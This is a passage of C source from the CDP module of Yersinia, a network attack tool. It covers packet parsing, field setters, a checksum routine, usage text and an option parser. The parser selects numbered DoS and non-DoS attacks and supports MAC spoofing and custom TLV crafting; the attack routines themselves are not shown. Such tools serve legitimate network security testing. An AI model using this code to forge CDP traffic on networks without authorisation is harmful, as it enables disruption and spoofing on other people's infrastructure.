    cdp_data = (u_char *) (data->packet + LIBNET_802_3_H + LIBNET_802_2SNAP_H);

    /* Source MAC */
    memcpy(cdp->mac_source, ether->_802_3_shost, ETHER_ADDR_LEN);
    /* Destination MAC */
    memcpy(cdp->mac_dest, ether->_802_3_dhost, ETHER_ADDR_LEN);

    /* Version */
    cdp->version = *((u_int8_t *)cdp_data);

    /* TTL */
    cdp->ttl = *((u_int8_t *)cdp_data + 1);

    /* Checksum... it is something boring to change the ck to 0... better we can
     * avoid it... 
#ifdef LBL_ALIGN
    memcpy((void *)&aux_short, cdp_data+2, 2);
    cdp->checksum = ntohs(aux_short);
#else
    cdp->checksum = ntohs(*(u_int16_t *)(cdp_data + 2));
#endif
*/
    ptr = cdp_data + 4;
    i = 0;
    total = 0;

    /* now the tlv section starts */
    while((ptr < data->packet + data->header->caplen) && (i < MAX_TLV) && (total < MAX_TLV*MAX_VALUE_LENGTH)) {
        if ((ptr+4) > ( data->packet + data->header->caplen)) /* Undersized packet !! */
            return 0;
#ifdef LBL_ALIGN
        memcpy((void *)&aux_short,ptr,2);
        type = ntohs(aux_short);
        memcpy((void*)&aux_short,(ptr+2),2);
        len = ntohs(aux_short);
#else
        type = ntohs(*(u_int16_t *)ptr);
        len = ntohs(*(u_int16_t *)(ptr + 2));
#endif

        if ((ptr + len) > data->packet + data->header->caplen)
            return -1; /* Oversized packet!! */

        if (!len)
            return 0;

        /*
         * TLV len must be at least 5 bytes (header + data).  
         * Anyway i think we can give a chance to the rest
         * of TLVs... ;)
         */
        if ((len >= 4) && (total + len < MAX_TLV*MAX_VALUE_LENGTH)) 
			memcpy((void *)(cdp->options + total), (void *)ptr, len);

        i++;
        ptr += len;
        total += len;
    }

    cdp->options_len = total;

    return 0;
}


int8_t 
cdp_update_field(int8_t state, struct term_node *node, void *value)
{
    struct cdp_data *cdp_data;
    
	if (node == NULL)
		cdp_data = protocols[PROTO_CDP].default_values;
	else
        cdp_data = node->protocol[PROTO_CDP].tmp_data;

    switch(state)
    {
		/* Source MAC */
        case CDP_SMAC:
			memcpy((void *)cdp_data->mac_source, (void *)value, ETHER_ADDR_LEN);
        break;

        /* Destination MAC */
        case CDP_DMAC:
			memcpy((void *)cdp_data->mac_dest, (void *)value, ETHER_ADDR_LEN);
        break;

        /* Version */
        case CDP_VER:
	        cdp_data->version = *(u_int8_t *)value;
        break;

        /* TTL */
        case CDP_TTL:
	        cdp_data->ttl = *(u_int8_t *)value;
        break;

        /* Checksum */
		case CDP_CHECKSUM:
	        cdp_data->checksum = *(u_int16_t *)value;
        break;
		default:
		break;
    }

    return 0;
}


int8_t 
cdp_init_attribs(struct term_node *node)
{
    struct cdp_data *cdp_data;

    cdp_data = node->protocol[PROTO_CDP].tmp_data;
    
    cdp_data->version = CDP_DFL_VERSION;
    cdp_data->ttl     = CDP_DFL_TTL;

    attack_gen_mac(cdp_data->mac_source);
    
    cdp_data->mac_source[0] &= 0x0E;
    
    parser_vrfy_mac("01:00:0C:CC:CC:CC", cdp_data->mac_dest);

    cdp_data->options_len = 0;

    return 0;
}


int8_t 
cdp_update_data(int8_t state, int8_t key, int8_t position, struct term_node *node)
{
    char **cdp;
    struct cdp_data *cdp_data;
    int8_t i;

    cdp_data = node->protocol[PROTO_CDP].tmp_data;

    if ((cdp = cdp_get_printable_store(node)) == NULL) {
	    write_log(0, "Error in cdp_get_printable_store\n");
	    return -1;
    }

    switch(state)
    {
        /* Source MAC */
        case CDP_SMAC:
            cdp[0][position] = key;
            for (i=0; i < 6; i++) 
                cdp_data->mac_source[i] = strtoul(&cdp[0][3*i], (char **)NULL, 16);
        break;

        /* Destination MAC */
        case CDP_DMAC:
            cdp[1][position] = key;
            for (i=0; i < 6; i++) 
                cdp_data->mac_dest[i] = strtoul(&cdp[1][3*i], (char **)NULL, 16);
        break;

        /* Version */
        case CDP_VER:
            cdp[2][position] = key;
            cdp_data->version = strtoul(cdp[2], (char **)NULL, 16);
        break;

        /* TTL */
        case CDP_TTL:
            cdp[3][position] = key;
            cdp_data->ttl = strtoul(cdp[3], (char **)NULL, 16);
        break;

        /* Checksum */
        case CDP_CHECKSUM:
            cdp[4][position] = key;
            cdp_data->checksum = strtoul(cdp[4], (char **)NULL, 16);
        break;
    }

    i = 0;
    while (cdp[i]) {
        free(cdp[i]);
        i++;
    }

    free(cdp);
    return 0;
}


/* returns the checksum 
 * WARNING: if left over bytes are present, the memory after *data has to
 * contain 0x00 series and should be part of the buffer
 * -> make the buffer for data at least count+1 bytes long ! */
u_int16_t chksum(u_int8_t *data, u_int32_t count) {
    u_int32_t sum;
    u_int16_t *wrd;

    sum = 0;
    wrd = (u_int16_t *)data;
    
    while( count > 1 )  {
        sum = sum + *wrd;
        wrd++;
        count -= 2;
    }

    /*  Add left-over byte, if any */
    if( count > 0 ) {
//	printf("Left over byte: %04X\n",((*wrd & 0xFF)<<8));
	    sum = sum + ((*wrd &0xFF)<<8);
    }

    /*  Fold 32-bit sum to 16 bits */
    while (sum >> 16) {
        sum = (sum & 0xffff) + (sum >> 16);
    }

    return (~sum);
}

void
cdp_help(void)
{
    write_log(2,"%s\n", bin_data);
    write_log(2,"\nUsage: %s cdp [-hM] [-v version] [-i interface] [-ttl ttl]\n", PACKAGE);
    write_log(2,"       [-source hw_addr] [-dest hw_addr] [-devid id] [-address address]\n");
    write_log(2,"       [-port id] [-capability cap] [-version version] [-duplex 0|1]\n");
    write_log(2,"       [-platform platform] [-ipprefix ip] [-phello hello] [-mtu mtu]\n");
    write_log(2,"       [-vtp_mgm_dom domain] [-native_vlan vlan] [-voip_vlan_r req]\n");
    write_log(2,"       [-voip_vlan_q query] [-t_bitmap bitmap] [-untrust_cos cos]\n");
    write_log(2,"       [-system_name name] [-system_oid oid] [-mgm_address address]\n");
    write_log(2,"       [-location location]  [-attack attack]\n");
    write_log(2,"       * Advanced TLV usage* [-type type] [-length length] [-value value]\n\n");
    write_log(2,"           -h    This help screen.\n\n");         
    write_log(2,"Please, see the man page for a full list of options and many examples.\n");
    write_log(2,"Send your bugs & suggestions to the Yersinia developers <yersinia@wasahero.org>\n\n");  
}


/*
 * CDP parser...
 */
int8_t 
cdp_parser( struct term_node *node, int8_t argc, char **args, void *tmp_data)
{
    int8_t carac, indx, aux, tmp, ifaces;
    u_int16_t aux_short;
    int opt_ind;
    struct cdp_data *cdp_data;
    struct term_tty *term_tty=NULL;
    struct attack *first_attack;

    static struct option options[] =
    {
        { "help",         0, 0, 'h' },        
        { "mac_spoofing", 0, 0, 'M' },
        { "M",            0, 0, 'M' },
        { "attack",       1, 0, 0 },
        { "X",            1, 0, 0 },
        { "v",            1, 0, 1 },
        { "i",            1, 0, 2 },
        { "source",       1, 0, 4 },
        { "s",            1, 0, 4 },
        { "dest",         1, 0, 5 },
        { "d",            1, 0, 5 },
        { "ttl",          1, 0, 6 },
        { "devid",        1, 0, 7 },
        { "address",      1, 0, 8 },
        { "portid",       1, 0, 9 },
        { "capability",   1, 0, 10 },
        { "version",      1, 0, 11 },
        { "platform",     1, 0, 12 },
        { "ipprefix",     1, 0, 13 },
        { "phello",       1, 0, 14 },
        { "vtp_mgm_dom",  1, 0, 15 },
        { "native_vlan",  1, 0, 16 },
        { "duplex",       1, 0, 17 },
        { "voip_vlan_r",  1, 0, 18 },
        { "voip_vlan_q",  1, 0, 19 },
        { "mtu",          1, 0, 20 },
        { "t_bitmap",     1, 0, 21 },
        { "untrust_cos",  1, 0, 22 },
        { "system_name",  1, 0, 23 },
        { "system_oid",   1, 0, 24 },
        { "mgm_address",  1, 0, 25 },
        { "location",     1, 0, 26 },
        { "type",         1, 0, 27 },
        { "length",       1, 0, 28 },
        { "value",        1, 0, 29 },
        { 0, 0, 0, 0 }
    };

    cdp_data = node->protocol[PROTO_CDP].tmp_data;

    ifaces = 0;

    term_tty = node->specific;

    while( (carac=getopt_long_only(argc,args,"hLYy",
                    options, &opt_ind)) != EOF)
    {
        switch(carac) 
        {
            case 0:
                aux=atoi(optarg);
                aux--;  /* Because our array starts with zero but user starts with 1... :) */
                indx = parser_command2index(cdp_attack, aux);
                if (cdp_attack[indx].s != NULL )
                    term_tty->attack = indx;
                else
                {
                    write_log(2,"\n  Ouch!! Invalid attack!! Valid %s ATTACK types are:\n", PACKAGE);
                    first_attack = cdp_attack;
                    while (first_attack->s != NULL) 
                    {
                        write_log(2,"         %d: %s attack %s\n",first_attack->v+1,
                                (first_attack->type)?"DOS":"NONDOS",
                                first_attack->s);
                        ++first_attack;
                    }
                    write_log(2,"\n");
                    return -1;
                }
                break;

            case 1:
                    cdp_data->version = atoi(optarg);
                break;

            case 2:
                if ((tmp = interfaces_get(optarg)) == -1)
                {
                   write_log(2,"Unable to use interface %s!! (Maybe nonexistent?)\n\n",optarg);
                   return -1;
                }
                 /* Don't repeat interface...*/
                if (!node->used_ints[tmp])
                {
                    if ((tmp = interfaces_add(optarg)) == -1)
                    {
                       write_log(2,"Unable to use interface %s!! (Maybe nonexistent?)\n\n",optarg);
                       return -1;
                    }
                    node->used_ints[tmp] = 1;
                    ifaces++;
                }
            break;

            case 4: 
                if ( parser_vrfy_mac(optarg,cdp_data->mac_source) )
                {
                    write_log(2,"Source MAC address incorrect!!\n");
                    return -1;
                }
                break;

            case 5: 
                if ( parser_vrfy_mac(optarg, cdp_data->mac_dest) )
                {
                    write_log(2,"Destination MAC address incorrect!!\n");
                    return -1;
                }
                break;

            case 6:
                cdp_data->ttl = atoi(optarg);
                break;

            case 7:
                if (cdp_create_tlv_item(cdp_data, CDP_TYPE_DEVID, optarg) < 0) {
                    write_log(2, "Maximum TLV excceded\n");
                    return -1;
                }
            break;

            case 9:
                if (cdp_create_tlv_item(cdp_data, CDP_TYPE_PORTID, optarg) < 0) {
                    write_log(2, "Maximum TLV excceded\n");
                    return -1;
                }
            break;

            case 11:
                if (cdp_create_tlv_item(cdp_data, CDP_TYPE_VERSION, optarg) < 0) {
                    write_log(2, "Maximum TLV excceded\n");
                    return -1;
                }
            break;

            case 12:
                if (cdp_create_tlv_item(cdp_data, CDP_TYPE_PLATFORM, optarg) < 0) {
                    write_log(2, "Maximum TLV excceded\n");
                    return -1;
                }
            break;

            case 27: /* type */
                if (cdp_create_tlv_item(cdp_data, atoi(optarg), "") < 0) {
                    write_log(2, "Maximum TLV exceeded\n");
                    return -1;
                }
            break;

            case 28: /* length */
                aux_short = htons(atoi(optarg));
                memcpy((void *)(cdp_data->options + 2), (void *)&aux_short, 2);
            break;

            case 29: /* value */
                aux_short = htons(atoi(optarg));
                memcpy((void *)(cdp_data->options + 4), (void *)&aux_short, 2);
                cdp_data->options_len += 2;
            break;

            case 'h': cdp_help();
                      return 0;
                      break;

            case 'M': node->mac_spoofing = 0;
                      break;

            case '?': return -1;
                      break;       
        }
    }

    /* select a default device if not specified */
    if (!ifaces)  {
        if (strlen(interfaces[0].ifname)) {
            write_log(2,"Warning: interface %s selected as the default one\n", &interfaces[0].ifname);
            if ((tmp = interfaces_add(interfaces[0].ifname)) == -1)
            {
               write_log(2,"Unable to use interface %s!! (Maybe nonexistent?)\n\n", interfaces[0].ifname);
               return -1;
            }
            else
                node->used_ints[tmp] = 1;
                ifaces++;
        } else {
            write_log(2,"Hmm... you don't have any valid interface. Go and get a life!\n");
            return -1;
        }
    }

   return 0;
}
/* vim:set tabstop=4:set expandtab:set shiftwidth=4:set textwidth=78: */
